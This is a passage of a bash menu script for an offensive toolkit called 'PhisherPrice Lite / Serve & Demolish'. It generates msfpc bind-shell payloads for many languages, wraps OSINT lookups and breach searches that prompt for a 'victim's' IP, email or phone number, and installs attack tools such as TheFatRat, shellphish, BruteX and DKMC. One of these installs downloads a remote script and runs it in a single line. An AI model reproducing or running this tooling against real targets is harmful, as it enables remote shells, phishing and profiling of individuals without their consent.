elif [ "$x" == "$cyouro5" ]; then                    #cyouro-Option-5
clear

msfpc asp bind 5555 verbose

read

elif [ "$x" == "$cyouro6" ]; then                    #cyouro-Option-6
clear

msfpc aspx bind 5555 verbose

read

elif [ "$x" == "$cyouro7" ]; then                    #cyouro-Option-7
clear

msfpc bash bind 5555 verbose

read

elif [ "$x" == "$cyouro8" ]; then                    #cyouro-Option-8
clear

msfpc java bind 5555 verbose

read

elif [ "$x" == "$cyouro9" ]; then                    #cyouro-Option-9
clear

msfpc perl bind 5555 verbose

read

elif [ "$x" == "$cyouro10" ]; then                    #cyouro-Option-10
clear

msfpc php bind 5555 verbose

read

elif [ "$x" == "$cyouro11" ]; then                    #cyouro-Option-11
clear

msfpc powershell bind 5555 verbose

read

elif [ "$x" == "$cyouro12" ]; then                    #cyouro-Option-12
clear

msfpc python bind 5555 verbose

read

elif [ "$x" == "$cyouro13" ]; then                    #cyouro-Option-13
clear

msfpc tomcat bind 5555 verbose

read

elif [ "$x" == "$cyouro14" ]; then                    #cyouro-Option-13
clear
msfconsole

else 

n


fi
elif [ "$x" == "$option4" ]; then                          #Option3
clear
echo -e '\e[1;33m
///,        ////
\  /,      /  >.
 \  /,   _/  /.
  \_  /_/   /.
   \__/_   <    PhisherPrice Lite
   /<<< \_\_  Serve & Demolish
  /,)^>>_._ \ Version 1.0.3 [BETA] 
  (/   \\ /\\\    [\e[3;31m PUBLIC \e[1;33m]
       // //```
------((`((--------------------\e[3;31m 
OSINT / INFORMATION GATHERING \e[1;33m 
------------------------------- \e[0m\e[3;39m
(0)AutoExif
(1) Whois Info
(2) Geo IP
(3) IP Lookup
(4) DNS Lookup
(5) Reverse DNS Lookup
(6) Shared DNS Lookup
(7) Reverse Analytics
(8) Autonomous System Lookup (AS/ASN/IP)
(9) Retreive HTTP Headers
(10) Banner Grab
(11) Link Sniffer
(12) Phone Number Lookup
(13) h8mail (Email)
(14) h8mail (Username)
(15) h8mail (IP)
(16) Cloudfare Resolver
(17) WhatWeb \e[1;33m
------------------------------- \e[0m\e[3;39m
       CTRL + C To Exit \e[1;33m
------------------------------- \e[0m\e[3;39m
Press ENTER To Go To Main Menu \e[1;33m
------------------------------- \e[0m\e[3;39m'
echo -e $Blue" ┌─["$red"S&D$Blue]──[$red~$Blue]─["$yellow"OSINT$Blue]"
read -p      " └─────► " x
submenu31='1'
submenu32='2'
submenu33='3'
submenu34='4'
submenu35='5'
submenu36='6'
submenu37='7'
submenu38='8'
submenu39='9'
submenu310='10'
submenu311='11'
submenu312='12'
submenu313='13'
submenu314='14'
submenu315='15'
submenu316='16'
submenu317='17'
submenu318='0'
if [ "$x" == "$submenu318" ]; then                    #submenu3-Option-15
clear
echo -e '\e[1;33m
///,        ////
\  /,      /  >.
 \  /,   _/  /.
  \_  /_/   /.
   \__/_   <    PhisherPrice Lite
   /<<< \_\_  Serve & Demolish
  /,)^>>_._ \ Version 1.0.3 [BETA] 
  (/   \\ /\\\    [\e[3;31m PUBLIC \e[1;33m]
       // //```
------((`((--------------------\e[3;31m 
AutoExif
Exif Tool AutoMated For Easy Conveinience  \e[1;33m 
------------------------------- \e[0m\e[3;39m
(1) Read Image MetaData (Basic)
(2) Read Image MetaData (Expert)
(3) Read Imge MetaData (From Website)
(4) Wipe Data From Image (Except JFIF Groups)
(5) Wipe All GPS Data From Image
(6) Wipe All MetaData From Image (Adds Comment Back In) 
(7) Extract GPS from AVCH video 
(8) Extract Info From Thumbnail
(9) Wipe Photoshop MetaData
(10) Install ExifTool
(i) Help\e[1;33m
------------------------------- \e[0m\e[3;39m
       CTRL + C To Exit \e[1;33m
------------------------------- \e[0m\e[3;39m
Press ENTER To Go To Main Menu \e[1;33m
------------------------------- \e[0m\e[3;39m'
echo -e $Blue" ┌─["$red"S&D$Blue]──[$red~$Blue]─["$yellow"wAutoExif$Blue]"
read -p      " └─────► " x
autoexiftool1='1'
autoexiftool2='2'
autoexiftool3='3'
autoexiftool4='4'
autoexiftool5='5'
autoexiftool6='6'
autoexiftool7='7'
autoexiftool8='8'
autoexiftool9='9'
autoexiftool10='10'
help='i'

if [ "$x" == "$autoexiftool1" ]; then                    #readmetadata basic
echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
read meta1
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!        Extracting Data        !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

exiftool $meta1

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Press ENTER To Go Back To The Main Menu
'

read


elif [ "$x" == "$autoexiftool2" ]; then                          #readmetadatadeep
echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
read mdeep
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!        Extracting Data        !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

cat $mdeep | exiftool -

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Press ENTER To Go Back To The Main Menu
'

read

elif [ "$x" == "$autoexiftool3" ]; then                          #webextract
echo "enter image location for eg: http://a.domain.com/bigfile.jpg"
read exifop1host
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!        Extracting Data        !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

curl -s $exifop1host | exiftool -fast -

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Press ENTER To Go Back To The Main Menu
'

read

elif [ "$x" == "$autoexiftool4" ]; then                          #autoexiftool4
echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
read exifop4
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!       Wiping JFIF Data        !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

exiftool -all= --jfif:all $exifop4

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!   Data Wiped Using AutoExif   !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Press ENTER To Go Back To The Main Menu
'

read


elif [ "$x" == "$autoexiftool5" ]; then                          #AVCHextract
echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
read exifop5
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!        Wiping GPS Data        !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

exiftool -gps:all= $exifop5

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!   Data Wiped Using AutoExif   !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Press ENTER To Go Back To The Main Menu
'

read

elif [ "$x" == "$autoexiftool6" ]; then                          #autoexiftool6
echo "enter image name followed by its file type eg: /home/username/Pictures/lulz.png"
read exifop6
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!        Replacing Data         !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

exiftool -all= -comment='Protected By NULLSecurity Team' $exifop6

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!! Data Replaced Using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Press ENTER To Go Back To The Main Menu
'

read

elif [ "$x" == "$autoexiftool7" ]; then                          #autoexiftool7
echo "enter image name followed by its file type eg: /home/username/Videos/lulz.m2ts"
read avch
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!        EXTRACTING PLEASE WAIT        !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

exiftool -ee -p '$gpslatitude, $gpslongitude, $gpstimestamp' $avch

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Press ENTER To Go Back To The Main Menu
'

read



elif [ "$x" == "$autoexiftool8" ]; then                          #AVCHExtract
echo "enter image name followed by its file type eg: /home/username/pictures/lulz.png"
read exif8
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!        EXTRACTING PLEASE WAIT        !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

exiftool $exif8 -thumbnailimage -b | exiftool -

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Press ENTER To Go Back To The Main Menu
'

read


elif [ "$x" == "$autoexiftool9" ]; then                          #autoexiftool9

echo -e '
Delete Photoshop meta information from an image (note that the Photoshop informatio nalso includes IPTC).
enter image name followed by its file type eg: /home/username/pictures/lulz.jpg
'
read psd
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!        EXTRACTING PLEASE WAIT        !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

exiftool -Photoshop:All= $psd

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!! Data Extracted using AutoExif !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Press ENTER To Go Back To The Main Menu
'

read

elif [ "$x" == "$autoexiftool10" ]; then                          #autoexiftool9
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
ExifTool Installation
\e[0;31m-------------------------------\e[1;34m'
echo "Are You Sure You Want To Install ExifTool ?"
echo "PRESS ENTER TO START ANY OTHER OPTION TO CANCEL"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
$r sudo apt-get install exif libimage-exiftool-perl libstring-crc32-perl libgd-perl
echo -e '\e[0;31m-------------------------------\e[1;33m
Fully Installed ExifTool
\e[0;31m-------------------------------\e[1;34m'
echo "Press ENTER To Go Back To Main Menu"
echo -e '\e[0;31m-------------------------------'
read -p "~"
echo -e '\e[0;31m-------------------------------\e[0;39m'
read


elif [ "$x" == "$help" ]; then                          #autoexiftool10

clear
echo -e '\e[1;33m
\e[0m
 \e[1;31m
You can Put This Script In The Desired Folder You Like Where The Media
Is Located Then You can execute the script
when the script is in the media folder you want you can just type the
Image name Along with file type instead of typing the image location aswell
For eg: instead of /home/username/Pictures/lulz.png
I would just type : lulz.png

you can find the original tool here https://github.com/sircryptic/autoexif
                          Press ENTER To Go Back To The Main Menu
'
read


else 

n


fi

elif [ "$x" == "$submenu31" ]; then                    #submenu3-Option-1
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
WHOIS QUERY
\e[0;31m-------------------------------\e[1;34m'
echo "Victim's IP Or Website:"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
whois $r
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read
elif [ "$x" == "$submenu32" ]; then                    #submenu3-Option-2
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
GEO IP LOOKUP
\e[0;31m-------------------------------\e[1;34m'
echo "Victim's IP Or Website:"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
curl http://api.hackertarget.com/geoip/?q=$r
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$submenu33" ]; then                    #submenu3-Option-3
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
REVERSE IP LOOKUP
\e[0;31m-------------------------------\e[1;34m'
echo "Victim's IP Or Website:"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
curl http://api.hackertarget.com/reverseiplookup/?q=$r
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read


elif [ "$x" == "$submenu34" ]; then                    #submenu3-Option-4
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
DNS LOOKUP
\e[0;31m-------------------------------\e[1;34m'
echo "Victim's IP Or Website:"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
curl http://api.hackertarget.com/dnslookup/?q=$r
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$submenu35" ]; then                    #submenu3-Option-5
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
REVERSE DNS LOOKUP
\e[0;31m-------------------------------\e[1;34m'
echo "Victim's IP Or Website:"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
curl https://api.hackertarget.com/reversedns/?q=$r
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$submenu36" ]; then                    #submenu3-Option-6
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
SHARED DNS LOOKUP
\e[0;31m-------------------------------\e[1;34m'
echo "Victim's IP Or Website:"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
curl https://api.hackertarget.com/findshareddns/?q=$r
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$submenu37" ]; then                    #submenu3-Option-7
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
REVERSE ANALYTICS LOOKUP
\e[0;31m-------------------------------\e[1;34m'
echo "Find Domains Using Same Google Ad-Sense ID"
echo "Enter Domain Name Or GA-ID"
echo "For example: UA-11223344 or testsite.com"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
curl https://api.hackertarget.com/analyticslookup/?q=$r
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$submenu38" ]; then                    #submenu3-Option-8
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
ASN LOOKUP
\e[0;31m-------------------------------\e[1;34m'
echo "Enter The ASN You Want To Scan."
echo "example usage: 1.1.1.1 / AS15169"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
curl https://api.hackertarget.com/aslookup/?q=$r
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$submenu39" ]; then                    #submenu3-Option-9
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
RETRIEVE HTTP HEADERS
\e[0;31m-------------------------------\e[1;34m'
echo "Victim's IP Or Website:"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
curl https://api.hackertarget.com/httpheaders/?q=$r
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$submenu310" ]; then                    #submenu3-Option-10
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
BANNER GRAB
\e[0;31m-------------------------------\e[1;34m'
echo "Victim's IP Or Website:"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
curl https://api.hackertarget.com/bannerlookup/?q=$r
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$submenu311" ]; then                    #submenu3-Option-11
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
LINK SNIFFER / PULL LINKS FROM WEBSITE
\e[0;31m-------------------------------\e[1;34m'
echo "this can reveal social media pages etc."
echo "Victim's IP Or Website:"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
curl https://api.hackertarget.com/pagelinks/?q=$r
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$submenu312" ]; then                    #submenu3-Option-12
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
PHONE NUMBER CHECKER
\e[0;31m-------------------------------\e[1;34m'
echo "Victim's Number"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
curl https://api.telnyx.com/anonymous/v2/number_lookup/$r
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$submenu313" ]; then                    #submenu3-Option-13
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
H8MAIL EMAIL LOOKUP
\e[0;31m-------------------------------\e[1;34m'
echo "Victim's Email"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
h8mail -t $r
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$submenu314" ]; then                    #submenu3-Option-14
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
H8MAIL USERNAME LOOKUP
\e[0;31m-------------------------------\e[1;34m'
echo "Username To Search"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
h8mail -t $r -q username -k "dehashed_email=user@email.com" "dehashed_key=ABCDE123"
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$submenu315" ]; then                    #submenu3-Option-15
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
H8MAIL IP LOOKUP
\e[0;31m-------------------------------\e[1;34m'
echo "ip To Search"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
cd&&h8mail -t $r -q ip -ch 2 --power-chase
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$submenu316" ]; then                    #submenu3-Option-19
clear

cd&&python3 cfresolve.py

read
elif [ "$x" == "$submenu317" ]; then                    #submenu3-Option-15
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
WhatWeb LOOKUP
\e[0;31m-------------------------------\e[1;34m'
echo "Target"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
whatweb -v -a 3 $r
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read
else
n
fi

elif [ "$x" == "$option5" ]; then                          #Option3
clear
echo -e '\e[1;33m
///,        ////
\  /,      /  >.
 \  /,   _/  /.
  \_  /_/   /.
   \__/_   <    PhisherPrice Lite
   /<<< \_\_  Serve & Demolish
  /,)^>>_._ \ Version 1.0.3 [BETA] 
  (/   \\ /\\\    [\e[3;31m PUBLIC \e[1;33m]
       // //```
------((`((--------------------\e[3;31m 
Download & Install Other Tools \e[1;33m 
------------------------------- \e[0m\e[3;39m-
(1) SpiderFoot
(2) Th3Inspector
(3) Sherlock
(4) PhoneInfoga
(5) BruteX
(6) WifiPumpkin3
(7) DroneSploit
(8) DirSearch
(9) H8Mail
(10) OSR Framework
(11) ShellPhish
(12) FatRat
(13) PRETty
(14) PhoneSploit
(15) Veil Framework
(16) Dont KIll My Cat
(17) RedGhost
(18) TorGhost
(19) KillTheGibson
(20) Impulse \e[1;33m
------------------------------- \e[0m\e[3;39m
       CTRL + C To Exit \e[1;33m
------------------------------- \e[0m\e[3;39m
Press ENTER To Go To Main Menu \e[1;33m
------------------------------- \e[0m\e[3;39m'
echo -e $Blue" ┌─["$red"S&D$Blue]──[$red~$Blue]─["$yellow"Other Tools$Blue]"
read -p      " └─────► " x
submenu41='1'
submenu42='2'
submenu43='3'
submenu44='4'
submenu45='5'
submenu46='6'
submenu47='7'
submenu48='8'
submenu49='9'
submenu410='10'
submenu411='11'
submenu412='12'
submenu413='13'
submenu414='14'
submenu415='15'
submenu416='16'
submenu417='17'
submenu418='18'
submenu419='19'
submenu420='20'

if [ "$x" == "$submenu41" ]; then                    #submenu4-Option-1
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
SpiderFoot Installation
\e[0;31m-------------------------------\e[1;34m'
echo "Are You Sure You Want To Install SpiderFoot"
echo "PRESS ENTER TO START ANY OTHER OPTION TO CANCEL"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
$r cd&&git clone https://github.com/smicallef/spiderfoot.git&&cd spiderfoot&&pip3 install -r requirements.txt&&firefox "https://www.spiderfoot.net/documentation/"
read
elif [ "$x" == "$submenu42" ]; then                    #submenu4-Option-2
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
Th3inspector Installation
\e[0;31m-------------------------------\e[1;34m'
echo "Are You Sure You Want To Install Th3inspector"
echo "PRESS ENTER TO START ANY OTHER OPTION TO CANCEL"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
$r cd&&git clone https://github.com/Moham3dRiahi/Th3inspector.git&&cd Th3inspector&&chmod +x install.sh && ./install.sh
read

elif [ "$x" == "$submenu43" ]; then                    #submenu4-Option-3
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
Sherlock Installation
\e[0;31m-------------------------------\e[1;34m'
echo "Are You Sure You Want To Install Sherlock ?"
echo "PRESS ENTER TO START ANY OTHER OPTION TO CANCEL"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
$r cd&&git clone https://github.com/sherlock-project/sherlock.git&&cd sherlock&&python3 -m pip install -r requirements.txt
echo "succefully installed sherlock"
read


elif [ "$x" == "$submenu44" ]; then                    #submenu4-Option-4
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
PhoneInfoga Installation
\e[0;31m-------------------------------\e[1;34m'
echo "this requires docker to be installed and a reboot is required"
echo "Are You Sure You Want To Install PhoneInfoga ?"
echo "1) Install docker"
echo "2) Install Phoneinfoga"
optioninstall='1'
optioninstall1='2'
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
if [ "$r" == "$optioninstall" ]; then 
# Install dependencies.
sudo apt install -y curl apt-transport-https \
     software-properties-common ca-certificates
# Install docker.
curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
echo "deb [arch=amd64] https://download.docker.com/linux/debian stretch stable" | \
  sudo tee /etc/apt/sources.list.d/docker-engine.list
sudo apt-get update -y
sudo apt-get install -y docker-ce
# Run docker.
sudo systemctl start docker
sudo systemctl enable docker
# Add user to docker group for using docker without sudo command.
sudo gpasswd -a "${USER}" docker
sudo reboot
elif [ "$r" == "$optioninstall1" ]; then 
docker pull sundowndev/phoneinfoga:latest&&docker run --rm -it sundowndev/phoneinfoga version
echo "succefully installed phoneinfoga"
read
else
n
fi

elif [ "$x" == "$submenu45" ]; then                    #submenu4-Option-5
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
BruteX Installation
\e[0;31m-------------------------------\e[1;34m'
echo "Are You Sure You Want To Install BruteX ?"
echo "PRESS ENTER TO START ANY OTHER OPTION TO CANCEL"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
$r cd&&git clone https://github.com/1N3/BruteX&&cd BruteX&&./install.sh
echo "succefully installed BruteX"
read
read

elif [ "$x" == "$submenu46" ]; then                    #submenu4-Option-6
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
wifipumpkin3 Installation
\e[0;31m-------------------------------\e[1;34m'
echo "Are You Sure You Want To Install wifipumpkin3 ?"
echo "PRESS ENTER TO START ANY OTHER OPTION TO CANCEL"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
$r sudo apt install python3.7-dev libssl-dev libffi-dev build-essential python3&&sudo apt install python3-pyqt5&&cd&&git clone https://github.com/P0cL4bs/wifipumpkin3.git&&cd wifipumpkin3&&sudo python3 setup.py install
echo "succefully installed wifipumpkin3"
read

elif [ "$x" == "$submenu47" ]; then                    #submenu4-Option-7
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
Dronesploit Installation
\e[0;31m-------------------------------\e[1;34m'
echo "Are You Sure You Want To Install Dronesploit"
echo "PRESS ENTER TO START ANY OTHER OPTION TO CANCEL"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
$r cd&&sudo pip3 install dronesploit
read

elif [ "$x" == "$submenu48" ]; then                    #submenu4-Option-8
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
dirsearch Installation
\e[0;31m-------------------------------\e[1;34m'
echo "Are You Sure You Want To Install dirsearch"
echo "PRESS ENTER TO START ANY OTHER OPTION TO CANCEL"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
$r cd&&git clone https://github.com/maurosoria/dirsearch.git
read


elif [ "$x" == "$submenu49" ]; then                    #submenu4-Option-9
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
H8mail Installation
\e[0;31m-------------------------------\e[1;34m'
echo "Are You Sure You Want To Install H8mail"
echo "PRESS ENTER TO START ANY OTHER OPTION TO CANCEL"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
$r cd&&sudo pip3 install h8mail
read

elif [ "$x" == "$submenu410" ]; then                    #submenu4-Option-10
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
osrframework Installation
\e[0;31m-------------------------------\e[1;34m'
echo "Are You Sure You Want To Install osrframework"
echo "PRESS ENTER TO START ANY OTHER OPTION TO CANCEL"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
$r cd&&sudo pip3 install osrframework
read

elif [ "$x" == "$submenu411" ]; then                    #submenu4-Option-11
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
shellphish Installation
\e[0;31m-------------------------------\e[1;34m'
echo "Are You Sure You Want To Install shellphish"
echo "PRESS ENTER TO START ANY OTHER OPTION TO CANCEL"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
$r git clone https://github.com/NULL-SECURITY-TEAM/shellphish&&cd shellphish&&chmod +x shellphish.sh
echo "done"
read

elif [ "$x" == "$submenu412" ]; then                    #submenu4-Option-12
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
FatRat Installation
\e[0;31m-------------------------------\e[1;34m'
echo "Are You Sure You Want To Install FatRat"
echo "PRESS ENTER TO START ANY OTHER OPTION TO CANCEL"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
$r cd&&git clone https://github.com/Screetsec/TheFatRat.git&&cd TheFatRat&&chmod +x setup.sh &&sudo ./setup.sh
echo "done"
read

elif [ "$x" == "$submenu413" ]; then                    #submenu4-Option-13
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
PreTty Installation
\e[0;31m-------------------------------\e[1;34m'
echo "Are You Sure You Want To Install PreTty"
echo "PRESS ENTER TO START ANY OTHER OPTION TO CANCEL"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0S;39m'
$r cd&&git clone https://github.com/RUB-NDS/PRET&&cd PRET&&pip install colorama pysnmp
echo "INSTALLATION COMPLETE"
read
elif [ "$x" == "$submenu414" ]; then                    #submenu4-Option-14
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
PreTty Installation
\e[0;31m-------------------------------\e[1;34m'
echo "Are You Sure You Want To Install PreTty"
echo "PRESS ENTER TO START ANY OTHER OPTION TO CANCEL"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0S;39m'
$r cd&&git clone https://github.com/SirCryptic/PS&&cd PS&&pip install colorama&&python2 ps.py
echo "INSTALLATION COMPLETE LAUNCHING PHONESPLOIT"
read

elif [ "$x" == "$submenu415" ]; then                    #submenu4-Option-15
clear
echo "Sub Option 15"

read

elif [ "$x" == "$submenu416" ]; then                    #submenu4-Option-16
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
DONT KILL MY CAT Installation
\e[0;31m-------------------------------\e[1;34m'
echo "Are You Sure You Want To Install DKMC "
echo "PRESS ENTER TO START ANY OTHER OPTION TO CANCEL"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0S;39m'
$r cd&&git clone https://github.com/Mr-Un1k0d3r/DKMC&&cd DKMC&&mkdir output&&python dkmc.py
echo "INSTALLATION COMPLETE LAUNCHING DKMC"

read


elif [ "$x" == "$submenu417" ]; then                    #submenu4-Option-17
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
RedGhost Installation
\e[0;31m-------------------------------\e[1;34m'
echo "Are You Sure You Want To Install RedGhost "
echo "PRESS ENTER TO START ANY OTHER OPTION TO CANCEL"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0S;39m'
$r cd&&wget https://raw.githubusercontent.com/d4rk007/RedGhost/master/redghost.sh; chmod +x redghost.sh; ./redghost.sh
echo "INSTALLATION COMPLETE, Launching RedGhost"

read

